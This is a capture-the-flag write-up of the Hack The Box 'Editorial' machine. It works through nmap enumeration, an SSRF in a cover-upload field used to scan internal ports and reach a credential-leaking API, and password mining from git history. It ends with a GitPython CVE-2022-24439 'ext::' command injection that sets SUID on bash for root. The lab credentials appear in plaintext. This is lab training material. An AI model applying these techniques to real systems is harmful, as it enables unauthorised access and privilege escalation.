---
title: "HTB Writeup: Editorial"
author: xpnt
date: 2024-06-18
image:
  path: https://pbs.twimg.com/media/GP9xs-ZW0AAMUeL?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box, "Season 5: Anomalies"]
tags: [labs,git-remote-ext,CVE-2022-24439,GitPython,SSRF,command injection]
---

# Writeup

- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/608)

## Enumeration
- The pentester started with a port scan and then discovered that ports `22` and `80` are open. Additionally, he noticed the existence of the domain `editorial.htb`, so he proceeded to add it to the `/etc/hosts` file.

```bash
# Nmap 7.94SVN scan initiated Tue Jun 18 10:10:42 2024 as: nmap -sCV -p 22,80 -n -Pn -oN
 scanPorts 10.10.11.20
Nmap scan report for 10.10.11.20
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/sub
mit/ .
# Nmap done at Tue Jun 18 10:10:53 2024 -- 1 IP address (1 host up) scanned in 11.11 sec
onds

```


- Given the existence of the domain `editorial.htb`, the pentester performed fuzzing with `gobuster` in the background in search of subdomains, but had no luck.

```bash
gobuster vhost -u http://editorial.htb -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://editorial.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

- The website `editorial.htb` is the web page of the company "Editorial Tiempo Arriba," which, as expected, is a book publisher. Therefore, the pentester enumerated the website in search of vulnerable functionalities to exploit.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618114156.png)

- The pentester noticed the existence of a form for authors, which allowed them to request "Editorial Tiempo Arriba" to publish their book. Alongside it, there was a functionality to view a book's cover, which allowed attaching a `URL` or `uploading it directly from the file system`. When uploading an image, it was stored on the web server. Therefore, the pentester delved deeper into this functionality for analysis.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618115224.png)

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618115356.png)

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618115439.png)

- The pentester selected the URL option, which pointed to their Python HTTP server. After clicking on "Preview," he received a request!!

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618115645.png)

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618115856.png)

- This is a perfect scenario to attempt exploiting SSRF in order to potentially access internal services on the target, if they exist. That's why the pentester resubmitted a URL and captured this request using BurpSuite for better management via the `Repeater` tool.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618120350.png)

- With that done, he attempted to enumerate `internal services`. He sent the request to the `Intruder` tab in BurpSuite, then selected the attack type as `Sniper` using the `port number` as the payload.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618120613.png)

- In the "Payloads" tab, he configured the "Number range" to iterate over the existing 65535 ports.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618121017.png)

- In the `Grep - Extract` section within the "Settings" tab, he selected the path of the file where the requested information would be uploaded. Then, he clicked on "Start attack."

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618121323.png)

- Upon completion, he received a match for port `5000`. 

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618174342.png)



- Consequently, he accessed the response and noticed the existence of an API listing corresponding endpoints.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618122603.png)

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618122631.png)

- To view it better, he copied the content and used the following command.

```bash
echo -n "<content_json_here>" | jq  > api_end.json
```

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}

```

## User

- The pentester set out to enumerate each of the `endpoints` to inspect their contents, starting with the `/api/latest/metadata/messages/authors` endpoint as it was potentially the most interesting due to likely containing confidential information. Upon requesting and inspecting it, the response contained credentials!

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618123437.png)

- Since the SSH service was open, he attempted to access using the credentials `dev : dev080217_devAPI!`. Great! The credentials were correct, and he was able to read `user.txt`.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618123655.png)


## Search privesc

- In the pursuit of escalating privileges on the target, the pentester began by enumerating the `home` directory of the user `dev`. He noticed the existence of a directory named `apps`, inside which there was a `.git` directory, presumably indicating that `apps` was a repository.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618124012.png)

- Listing the commits of the `apps` repository with the following command allowed the pentester to get an idea of what changes had been made in the repository.

```bash
git log --pretty=format:"%h - %an, %ar : %s"
```

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618125031.png)

- In addition to listing the commits, he noticed that all changes had been made by the user `dev-carlos.valderrama`. To verify if this user was the only one on the system, he conducted user enumeration and observed another user named `prod` on the target.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618100825.png)



- After an extensive enumeration as the user `dev`, the pentester did not succeed in finding a way to escalate privileges to `root`. Therefore, he decided to search for credentials for the user `prod`, as this user might have higher privileges that could potentially lead to root access. The first thing he did was search for credentials in the commits using the following oneliner, and he managed to find them!

```bash
git log --pretty=format:"%h" | while read -r commith;do PAGER= git show $commith |grep pass ;done
```

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618130053.png)

- With these credentials (`prod : 080217_Producti0n_2023!@`), he managed to access SSH as the user `prod`.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618130421.png)


- After continuing with enumeration, he discovered that the user `prod` can execute the following command as `root`

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618130648.png)

- Upon inspecting the code of the file `clone_prod_change.py`, he noticed that it involved changing directory to `/opt/internal_apps/clone_changes` to clone a repository specified as the first parameter.

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

- The pentester searched for excessive rights in the directories that needed to be traversed to reach `clone_prod_change.py` and reviewed the PATH for a library hijacking, but had no luck.

```bash
find / -user prod -exec ls -ldah {} \; 2>/dev/null
```

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618101812.png)

- So the pentester searched for vulnerabilities related to `git clone` and found the [`CVE-2022-24439`](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618153543.png)

## A little bit of **git-remote-ext**

- What is `ext::`? The term `ext::` in Git refers to a smart transport protocol that serves as a bridge to an external command. It is part of the `gitremote-helpers`, which are helper programs designed to interact with remote repositories. `git-remote-ext` is an example of such a remote helper, and it has its own syntax for the commands it executes.In this syntax, for the literal space in command or argument(`' '`) to be correctly interpreted, it is necessary to replace it with the following sequence characters `'% '` . I recommend reading the official documentation for [`git-remote-ext`](https://git-scm.com/docs/git-remote-ext) to gain a deeper understanding of its usage and syntax.

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618170559.png)

- As mentioned in the documentation [`PLUGIN-UNSAFE-ACTIONS`](https://github.com/steveukx/git-js/blob/main/docs/PLUGIN-UNSAFE-ACTIONS.md) of the official `git-js` repository, `helper transports` can be used to call `arbitrary binaries` on the host machine. It is recommended not to enable them in scripts where you do not have control over the input parameters. It's worth noting that there are CVEs very similar to [`CVE-2022-24439`](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858), such as [CVE-2022-25912](https://www.cve.org/CVERecord?id=CVE-2022-24433) found in the `simple-git` library

>Comments: To track issues within `gitpython`, I recommend checking the following [link](https://github.com/gitpython-developers/GitPython/issues/1517).
{: .prompt-info }


- This [`CVE-2022-24439`](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858) essentially allows Remote Code Execution (RCE) in `GitPython` versions prior to `3.1.30` due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. **This is only relevant when enabling the `ext` transport protocol** . So, the pentester decided to attempt to exploit this vulnerability. First, he verified the version of the Python library `GitPython` and noted it was version `3.1.29`.

```bash
pip3 show gitpython | grep Version
```

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618171559.png)
- Now, the only remaining step would be to verify that the `ext` transport protocol is enabled. However, to check this, the user `prod` would need to have read capabilities for the file `/root/.gitconfig`, which evidently he do not possess.

```bash
cat /root/.gitconfig
```

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618173103.png)

- It's important to note that the `ext` transport protocol is enabled by default, and to disable it, you need to add the following line to the `.gitconfig` file: `[protocol "ext"] enabled = false`. This workaround is suggested by `Vulert` as a temporary solution to [CVE-2022-25912](https://vulert.com/vuln-db/CVE-2022-25912).



## Root

- Therefore, the pentester attempted to exploit the vulnerability. Since the injected command would execute as `root`, he choses to grant `SUID privileges` to `/bin/bash`. Great! He successfully exploited the vulnerability.

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::bash -c chmod% u+s"
```

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618163344.png)


- Given that `/bin/bash` has SUID privileges, all that was left was to execute `bash -p`, and he was able to read `root.txt`!


```bash
bash -p
cat /root/root.txt
```

![](/assets/images/HTB-Writeup-Editorial/Pasted image 20240618163514.png)



>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/profile/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }